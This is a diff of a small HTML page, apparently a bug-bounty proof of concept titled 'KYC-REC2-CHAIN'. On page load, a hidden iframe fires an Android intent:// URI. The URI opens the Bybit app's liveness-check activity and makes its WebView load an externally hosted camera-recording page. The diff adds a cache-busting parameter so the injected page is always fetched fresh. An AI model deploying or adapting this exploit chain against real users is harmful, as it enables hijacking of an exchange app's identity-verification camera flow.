@@ -1,9 +1,11 @@
 <!doctype html><html><body style="font:15px monospace;padding:8px"><h3>KYC-REC2-CHAIN</h3><pre id="o">arming</pre>
 <iframe id="f" style="width:1px;height:1px"></iframe>
 <script>
+// 运行期随机 cache-buster：确保内层页面永不走 WebView 缓存
+var inner='https://createnewdemo.github.io/bbprobe/cam_rec2.html?cb='+Date.now()+'&token=t&signatureId=s';
 var intent='intent://#Intent;action=android.intent.action.VIEW'
  +';component=com.bybit.app%2Faai.liveness.web.SolutionActivity'
- +';S.url=https://createnewdemo.github.io/bbprobe/cam_rec2.html%3Fv%3D1790066696%26token%3Dt%26signatureId%3Ds;end';
+ +';S.url='+inner.replace(/&/g,'%26')+';end';
 document.getElementById('o').textContent+='\n'+intent;
 document.getElementById('f').src=intent;
 </script></body></html>
